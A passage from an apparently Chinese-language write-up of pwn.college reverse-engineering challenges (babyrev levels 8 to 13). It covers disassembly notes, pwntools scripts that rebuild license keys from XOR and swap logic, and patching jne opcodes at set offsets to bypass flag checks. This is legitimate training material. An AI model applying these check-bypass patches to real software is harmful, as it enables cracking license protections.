class="hljs-number">0</span>x93, <span class="hljs-number">0</span>x75, <span class="hljs-number">0</span>x0b, <span class="hljs-number">0</span>xbc, <span class="hljs-number">0</span>x64, <span class="hljs-number">0</span>x69, <span class="hljs-number">0</span>x9b, <span class="hljs-number">0</span>xe8, <span class="hljs-number">0</span>x5d, <span class="hljs-number">0</span>x97, <span class="hljs-number">0</span>x9d, <span class="hljs-number">0</span>x77, <span class="hljs-number">0</span>x10, <span class="hljs-number">0</span>xb2, <span class="hljs-number">0</span>x7b, <span class="hljs-number">0</span>x6e, <span class="hljs-number">0</span>x9b, <span class="hljs-number">0</span>xe9, <span class="hljs-number">0</span>x4b, <span class="hljs-number">0</span>x93, <span class="hljs-number">0</span>x87, <span class="hljs-number">0</span>x6b, <span class="hljs-number">0</span>x13, <span class="hljs-number">0</span>xbd, <span class="hljs-number">0</span>x75, <span class="hljs-number">0</span>x60, <span class="hljs-number">0</span>x9b, <span class="hljs-number">0</span>xf9, <span class="hljs-number">0</span>x53, <span class="hljs-number">0</span>x8f, <span class="hljs-number">0</span>x93<br></code></pre></td></tr></table></figure><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span>+buf+<span class="hljs-number">3</span>]# <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span> + buf + <span class="hljs-number">3</span>]<br><span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">rbp</span>+var_4C], <span class="hljs-built_in">al</span><br><span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span>+var_28+<span class="hljs-number">4</span>]# <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span> + buf + <span class="hljs-number">6</span>]<br><span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">rbp</span>+var_4B], <span class="hljs-built_in">al</span><br><span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">eax</span>, [<span class="hljs-built_in">rbp</span>+var_4B]<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span>+buf+<span class="hljs-number">3</span>], <span class="hljs-built_in">al</span><br><span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">eax</span>, [<span class="hljs-built_in">rbp</span>+var_4C]<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span>+var_28+<span class="hljs-number">4</span>], <span class="hljs-built_in">al</span># 交换<span class="hljs-number">3</span>和<span class="hljs-number">6</span><br><span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">rbp</span>+var_40], <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span>+var_20+<span class="hljs-number">6</span>]# 等价为 <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span> + buf + <span class="hljs-number">16</span>]<br><span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">rbp</span>+var_4E], <span class="hljs-built_in">al</span><br><span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span>+var_10]# 等价为 <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span> + buf + <span class="hljs-number">20</span>]<br><span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">rbp</span>+var_4D], <span class="hljs-built_in">al</span><br><span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">eax</span>, [<span class="hljs-built_in">rbp</span>+var_4D]<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span>+var_20+<span class="hljs-number">6</span>], <span class="hljs-built_in">al</span># 交换<span class="hljs-number">16</span>和<span class="hljs-number">20</span><br><span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">eax</span>, [<span class="hljs-built_in">rbp</span>+var_4E]<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span>+var_10], <span class="hljs-built_in">al</span><br></code></pre></td></tr></table></figure><p>动态调试：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">原始输入：<br>xwwtngaurrlkodniozqnvoyennptjlxvqeyqm<span class="hljs-number">22</span> ---- <span class="hljs-number">32</span><br>第一个： <span class="hljs-number">0x5ee6a471a571</span> (断点地址)<br>xwwtngaurrlkodniozqnvoqennptjlxvyeyqm<br>第二个： <span class="hljs-number">0x5ee6a471a5de</span><br>xwwtngaurrlkodniozqnvoqennptjlxvyeyqm<br><br>xwwtngaurrlkodniozqnvoyennptjlevqxyqm<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">xwwtngaurrlkodniozqnvoyennptjlevqxyqm</span><span class="hljs-number">3</span> ---- <span class="hljs-number">12</span><br><span class="hljs-attribute">xwwtngaurrlkodniozqnvoqennptjlevyxyqm</span><br><span class="hljs-attribute">mqyxyveljtpnneqovnqzoindoklrruagntwwx</span><br><span class="hljs-attribute">mqynyveljtpnxeqovnqzoindoklrruagntwwx</span><br></code></pre></td></tr></table></figure><p>调试过程中，发现两个swap的具体交换位置。然后写exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&quot;/challenge/babyrev_level8.1&quot;</span>)<br><br>hex_string=[<span class="hljs-number">0x79</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x8c</span>, <span class="hljs-number">0xe8</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x8e</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x0b</span>, <span class="hljs-number">0xbc</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x9b</span>, <span class="hljs-number">0xe8</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0xb2</span>, <span class="hljs-number">0x7b</span>, <span class="hljs-number">0x6e</span>, <span class="hljs-number">0x9b</span>, <span class="hljs-number">0xe9</span>, <span class="hljs-number">0x4b</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0xbd</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x9b</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x8f</span>, <span class="hljs-number">0x93</span>]<br>payload=<span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(hex_string))<br><span class="hljs-comment"># xor</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">37</span>):<br>    <span class="hljs-keyword">if</span> i % <span class="hljs-number">5</span> == <span class="hljs-number">0</span>:<br>        hex_string[i] ^= <span class="hljs-number">0x5c</span><br>    <span class="hljs-keyword">elif</span> i % <span class="hljs-number">5</span> == <span class="hljs-number">1</span>:<br>        hex_string[i] ^= <span class="hljs-number">0xa3</span><br>    <span class="hljs-keyword">elif</span> i % <span class="hljs-number">5</span> == <span class="hljs-number">2</span>:<br>        hex_string[i] ^= <span class="hljs-number">0xbd</span><br>    <span class="hljs-keyword">elif</span> i % <span class="hljs-number">5</span> == <span class="hljs-number">3</span>:<br>        hex_string[i] ^= <span class="hljs-number">0x29</span><br>    <span class="hljs-keyword">else</span>:<br>        hex_string[i] ^= <span class="hljs-number">0x6c</span><br><br><span class="hljs-comment"># xor</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">37</span>):<br>    <span class="hljs-keyword">if</span> i % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>:<br>        hex_string[i] ^= <span class="hljs-number">0xa4</span><br>    <span class="hljs-keyword">else</span>:<br>        hex_string[i] ^= <span class="hljs-number">0x48</span><br><br><span class="hljs-comment"># swap</span><br>temp = hex_string[<span class="hljs-number">3</span>]<br>hex_string[<span class="hljs-number">3</span>] = hex_string[<span class="hljs-number">12</span>]<br>hex_string[<span class="hljs-number">12</span>] = temp<br><br><br><span class="hljs-comment"># reverse</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">18</span>):<br>    temp = hex_string[i]<br>    hex_string[i] = hex_string[<span class="hljs-number">36</span> - i]<br>    hex_string[<span class="hljs-number">36</span> - i] = temp<br><br><span class="hljs-comment"># swap</span><br>temp = hex_string[<span class="hljs-number">22</span>]<br>hex_string[<span class="hljs-number">22</span>] = hex_string[<span class="hljs-number">32</span>]<br>hex_string[<span class="hljs-number">32</span>] = temp<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(hex_string)):<br>    payload += <span class="hljs-built_in">chr</span>(hex_string[i])<br><br><span class="hljs-built_in">print</span>(payload)<br>io.sendafter(<span class="hljs-string">&#x27;Ready to receive your license key!\n&#x27;</span>,payload)<br><br>data = io.recvall()<br><span class="hljs-built_in">print</span>(data.decode())<br><br></code></pre></td></tr></table></figure><h4 id="level9-0"><a href="#level9-0" class="headerlink" title="level9.0"></a>level9.0</h4><p>看源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">v12 = ((<span class="hljs-type">unsigned</span> __int64)bin_padding &amp; <span class="hljs-number">0xFFFFFFFFFFFFF000L</span>L) - <span class="hljs-number">4096</span>;<br><span class="hljs-keyword">do</span><br>  v3 = v6++;<br><span class="hljs-keyword">while</span> ( !mprotect((<span class="hljs-type">void</span> *)((v3 &lt;&lt; <span class="hljs-number">12</span>) + v12), <span class="hljs-number">0x1000u</span>LL, <span class="hljs-number">7</span>) );<br><span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">4</span>; ++i )<br>&#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Changing byte %d/5.\n&quot;</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)(i + <span class="hljs-number">1</span>));<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Offset (hex) to change: &quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%hx&quot;</span>, &amp;v5);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;New value (hex): &quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%hhx&quot;</span>, &amp;v4);<br>  *(_BYTE *)(v5 + v12) = v4;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The byte has been changed: *%p = %hhx.\n&quot;</span>, (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *)(v12 + v5), v4);<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>关于可执行文件的装载——页映射（理解上述源码的v12是什么）</p><p><strong>静态装载</strong>——程序执行时所需要的指令和数据必须在内存中才能够正常运行，最简单的办法就是将程序运行所需要的指令和数据全都装入内存中，这样程序就可以顺利运行，这就是最简单的静态装入的办法。</p><p>**问题：**很多情况下程序所需要的内存数量大于物理内存的数量。</p><p>根本的解决办法是<strong>添加物理内存</strong>。相对于磁盘来说，内存是昂贵的，因此人们想尽各种办法，<strong>希望能够不添加内存的情况下，让更多的程序运行起来，尽可能有效地利用内存。</strong></p><p>那么为了良好地解决这个问题，研究人员发现，程序运行时是有局部性原理的，所以，将程序最常用的部分驻留在内存中，而将一些不太常用的数据存放在磁盘里面，这就是动态装载的基本原理。<strong>动态装载的思想是程序用到哪个模块，就将哪个模块装入内存，如果不用就暂时不装入，存放在磁盘中。</strong></p><p><strong>页映射</strong>——页映射不是一下子就把程序所有的数据和指令都装入内存，而是将内存和所有磁盘中的数据和指令按照“页(Page)”为单位划分成若干个页，以后所有的装载和操作的单位就是页。<strong>硬件规定的页的大小</strong>由4096字节、8192字节、2MB、4MB等，最常见的Intel IA32处理器一般都是用4096字节。这题所使用到的分页也是4096字节为一页。</p><p>假设程序所有的指令和数据的总和为32KB，机器为32位有16KB的内存，每个页大小为4096字节。那么程序总共被分为8个页。可人为将它们编号P0~P7。很明显，16KB的内存无法同时将32KB的程序装入，那么将按照动态装入的原理来进行整个装入过程。如果程序刚开始执行时的入口地址在P0，这时装载管理器发现程序的P0不在内存中，于是将内存F0分配给P0，并且将P0的内容装入F0；运行一段时间以后，程序需要用到P5，于是装载管理器将P5装入F1；就这样，映射关系如下所示：</p><img src="/2025/03/01/pwn-college-%E9%A2%98%E8%A7%A3/image-20250304121108218.png" class="" title="image-20250304121108218"><p>【来源：《程序员的自我修养》P156】</p></blockquote><p>可以知道，v12计算得出上一页的起始地址。一页为4096字节。</p><p>解题思路：看到了if memcmp分支的条件。在ida中查看。其是jne，并且根据查表：<a href="http://unixwiz.net/techtips/x86-jumps.html">Intel x86 JUMP quick reference</a>，可知jne的opcode是75，我们将其改成74即可控制分支。</p><p>根据思路，我们需要修改jne的opcode，通过gdb调试一下能够知道偏移量为<code>0x27c1</code>。最后我们只需要修改该位置的opcode为74，即可拿到flag。</p><h4 id="level9-1"><a href="#level9-1" class="headerlink" title="level9.1"></a>level9.1</h4><p>思路同上，偏移为<code>0x1789</code>，不过这题用gdb调试的时候，没有main这个符号。可以设置断点在<code>_start</code>处，然后一步步调试。到main处的时候，就能拿到main的地址。然后使用<code>disassemble 起始地址,终止地址</code>来查看这个地址区间的反汇编结果。然后就能查看jne指令的地址。最后算出偏移为0x1789，再修改opcode就行了。</p><h4 id="level10-0"><a href="#level10-0" class="headerlink" title="level10.0"></a>level10.0</h4><p>只能修改一个字节，但是够了。思路还是以上的思路。算出偏移地址为：<code>0x1F17</code></p><h4 id="level10-1"><a href="#level10-1" class="headerlink" title="level10.1"></a>level10.1</h4><p><code>gdb</code>的<code>finish</code>命令能够帮助快速执行完当前函数，断点可以打在<code>memcmp</code>函数这儿。偏移量为<code>0x201e</code></p><h4 id="level11-0"><a href="#level11-0" class="headerlink" title="level11.0"></a>level11.0</h4><p>思路一致，只不过这时需要修改的是两个jne指令为jn指令，所以需要找到两个偏移量。还是按照前面题目的思路，找到的两个偏移量为：<code>0x2857</code>和<code>0x2ae9</code></p><h4 id="level11-1"><a href="#level11-1" class="headerlink" title="level11.1"></a>level11.1</h4><p>还是老套路，这次没有符号了。依然可以gdb调试拿到偏移量：<code>0x197b+1</code>和<code>0x1a5a</code>。</p><p>为什么要+1？是因为通过ida pro打开源程序后，发现它是带符号的opcode，因此查阅后需要将<code>OF 85</code>改成<code>OF 84</code>，所以，需要+1修改后面那个字节的值。而后面那个偏移不需要+1因为它时不带符号的opcode。因此后面的偏移值改成74即可。</p><h4 id="level12-0"><a href="#level12-0" class="headerlink" title="level12.0"></a>level12.0</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __fastcall __noreturn <span class="hljs-title function_">execute_program</span><span class="hljs-params">(_BYTE *a1)</span><span class="hljs-comment">// al指向一个全为0的char数组，长度为256字节。</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">size_t</span> v3; <span class="hljs-comment">// rax</span><br>  _BOOL4 v4; <span class="hljs-comment">// [rsp+1Ch] [rbp-94h]</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">136</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-90h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v6; <span class="hljs-comment">// [rsp+A8h] [rbp-8h]</span><br><br>  v6 = __readfsqword(<span class="hljs-number">0x28u</span>);<br>  read(<span class="hljs-number">0</span>, a1 + <span class="hljs-number">67</span>, <span class="hljs-number">6uLL</span>); <span class="hljs-comment">// 接收用户输入的6个字节，从char[67]开始</span><br>  a1[<span class="hljs-number">99</span>] = <span class="hljs-number">18</span>;<br>  a1[<span class="hljs-number">100</span>] = <span class="hljs-number">-84</span>;<br>  a1[<span class="hljs-number">101</span>] = <span class="hljs-number">-73</span>;<br>  a1[<span class="hljs-number">102</span>] = <span class="hljs-number">-78</span>;<br>  a1[<span class="hljs-number">103</span>] = <span class="hljs-number">-91</span>;<br>  a1[<span class="hljs-number">104</span>] = <span class="hljs-number">26</span>;<br>  v1 = <span class="hljs-built_in">memcmp</span>(a1 + <span class="hljs-number">99</span>, a1 + <span class="hljs-number">67</span>, <span class="hljs-number">6uLL</span>);<br>  v4 = v1 == <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> ( v1 )<br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;INCORRECT!&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;CORRECT! Your flag: &quot;</span>);<br>    v2 = open(<span class="hljs-string">&quot;/flag&quot;</span>, <span class="hljs-number">0</span>);<br>    v3 = read(v2, buf, <span class="hljs-number">0x64u</span>LL);<br>    write(<span class="hljs-number">1</span>, buf, v3);<br>  &#125;<br>  <span class="hljs-built_in">exit</span>(!v4);<br>&#125;<br></code></pre></td></tr></table></figure><p>将al数组&#x3D;[18, -84, -73, -78, -91, -26]使用python中的<code>struct.pack</code>打包成字节序，然后发送给目标程序就行了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&#x27;/challenge/babyrev-level-12-0&#x27;</span>)<br>al = [<span class="hljs-number">18</span>, -<span class="hljs-number">84</span>, -<span class="hljs-number">73</span>, -<span class="hljs-number">78</span>, -<span class="hljs-number">91</span>, <span class="hljs-number">26</span>]<br><br>payload = struct.pack(<span class="hljs-string">&#x27;6b&#x27;</span>, *al)<br><span class="hljs-built_in">print</span>(payload)<br>p.send(payload)<br><span class="hljs-built_in">print</span>(p.readall())<br></code></pre></td></tr></table></figure><blockquote><p>struct.pack说明：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">struct.pack(fmt, v1, v2, ...)<br></code></pre></td></tr></table></figure><ul><li><code>fmt</code>：格式字符串，指定如何将数据打包成二进制。格式字符串由字符组成，每个字符表示一种数据类型。</li><li><code>v1,v2,...</code>：要打包的数据，可以是整数、浮点数、字符串等。</li></ul><p>格式字符串<code>fmt</code>由字节顺序(<code>@,=,&lt;,&gt;,!</code>)和数据类型(<code>c,b,B,?,h,H,i,I,l,L,q,Q,f,d,s,p,x</code>)组成。其中字节顺序可选，<code>@</code>默认，使用本地字节顺序、大小和对齐方式。<code>=</code>使用本地字节序，标准大小，无对其。<code>&lt;</code>小端模式，<code>&gt;</code>大端模式，<code>!</code>网络字节序（大端模式）。后续的数据类型常见的有：</p><p><code>c</code>：字符；<code>b</code>：有符号字节；<code>B</code>：无符号字节；<code>h</code>：有符号短整型；<code>H</code>：无符号短整型；<code>i</code>：有符号整型；<code>I</code>：无符号整型；<code>s</code>：字符串，需要指定长度，例如<code>10s</code>表示10字节的字符串</p></blockquote><h4 id="level12-1"><a href="#level12-1" class="headerlink" title="level12.1"></a>level12.1</h4><p>同理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&#x27;/challenge/babyrev-level-12-1&#x27;</span>)<br>al = [<span class="hljs-number">61</span>,<span class="hljs-number">118</span>,-<span class="hljs-number">61</span>,-<span class="hljs-number">110</span>]<br><br>payload = struct.pack(<span class="hljs-string">&#x27;4b&#x27;</span>, *al)<br><span class="hljs-built_in">print</span>(payload)<br>p.send(payload)<br><span class="hljs-built_in">print</span>(p.readall())<br></code></pre></td></tr></table></figure><h4 id="level13-0"><a href="#level13-0" class="headerlink" title="level13.0"></a>level13.0</h4><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs armasm">[s] IMM <span class="hljs-keyword">b</span> = <span class="hljs-number">0x71</span><br>[s] IMM c = <span class="hljs-number">0x1</span><br>[s] IMM a = <span class="hljs-number">0xbd</span><br>[s] <span class="hljs-keyword">STM</span> *<span class="hljs-keyword">b</span> = a# <span class="hljs-built_in">a1</span>[<span class="hljs-number">0x71</span>] = <span class="hljs-number">0xbd</span><br>[s] <span class="hljs-keyword">ADD</span> <span class="hljs-keyword">b</span> c<br>[s] IMM a = <span class="hljs-number">0xb5</span><br>[s] <span class="hljs-keyword">STM</span> *<span class="hljs-keyword">b</span> = a# <span class="hljs-built_in">a1</span>[<span class="hljs-number">0x72</span>] = <span class="hljs-number">0xb5</span> <br>[s] <span class="hljs-keyword">ADD</span> <span class="hljs-keyword">b</span> c<br>[s] IMM a = <span class="hljs-number">0xd8</span><br>[s] <span class="hljs-keyword">STM</span> *<span class="hljs-keyword">b</span> = a# <span class="hljs-built_in">a1</span>[<span class="hljs-number">0x73</span>] = <span class="hljs-number">0xd8</span><br>[s] <span class="hljs-keyword">ADD</span> <span class="hljs-keyword">b</span> c<br>[s] IMM a = <span class="hljs-number">0xdc</span><br>[s] <span class="hljs-keyword">STM</span> *<span class="hljs-keyword">b</span> = a# <span class="hljs-built_in">a1</span>[<span class="hljs-number">0x74</span>] = <span class="hljs-number">0xdc</span><br>[s] <span class="hljs-keyword">ADD</span> <span class="hljs-keyword">b</span> c<br>[s] IMM a = <span class="hljs-number">0xbd</span><br>[s] <span class="hljs-keyword">STM</span> *<span class="hljs-keyword">b</span> = a# <span class="hljs-built_in">a1</span>[<span class="hljs-number">0x75</span>] = <span class="hljs-number">0xbd</span><br>[s] <span class="hljs-keyword">ADD</span> <span class="hljs-keyword">b</span> c<br>[s] IMM a = <span class="hljs-number">0x98</span><br>[s] <span class="hljs-keyword">STM</span> *<span class="hljs-keyword">b</span> = a# <span class="hljs-built_in">a1</span>[<span class="hljs-number">0x76</span>] = <span class="hljs-number">0x98</span><br>[s] <span class="hljs-keyword">ADD</span> <span class="hljs-keyword">b</span> c<br></code></pre></td></tr></table></figure><p>可以看到是一系列寄存器&#x2F;立即数的操作。题目要求输入6个字节。 而上述正好是从<code>a1[113]</code>开始，写入了6个字节。因此，我们把这6个字节转换成字节序丢给它即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&#x27;/challenge/babyrev-level-13-0&#x27;</span>)<br>al = [<span class="hljs-number">0xbd</span>,<span class="hljs-number">0xb5</span>,<span class="hljs-number">0xd8</span>,<span class="hljs-number">0xdc</span>,<span class="hljs-number">0xbd</span>,<span class="hljs-number">0x98</span>]<br><br>payload = struct.pack(<span class="hljs-string">&#x27;6B&#x27;</span>, *al)<br><span class="hljs-built_in">print</span>(payload)<br>p.send(payload)<br><span class="hljs-built_in">print</span>(p.readall())<br></code></pre></td></tr></table></figure><h4 id="level13-1"><a href="#level13-1" class="headerlink" title="level13.1"></a>level13.1</h4><p>现在，题目不会打印出汇编伪代码了。就得自己通过ida 看出来。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sub_1533</span>(a1, <span class="hljs-number">1</span>LL, <span class="hljs-number">91</span>LL);<br><span class="hljs-attribute">sub_1533</span>(a1, <span class="hljs-number">8</span>LL, <span class="hljs-number">1</span>LL);<br><span class="hljs-attribute">sub_1533</span>(a1, <span class="hljs-number">2</span>LL, <span class="hljs-number">70</span>LL);<br><span class="hljs-attribute">sub_1687</span>(a1, <span class="hljs-number">1</span>LL, <span class="hljs-number">2</span>LL);<br><span class="hljs-attribute">sub_1568</span>(a1, <span class="hljs-number">1</span>LL, <span class="hljs-number">8</span>LL);<br><span class="hljs-attribute">sub_1533</span>(a1, <span class="hljs-number">2</span>LL, <span class="hljs-number">236</span>LL);<br><span class="hljs-attribute">sub_1687</span>(a1, <span class="hljs-number">1</span>LL, <span 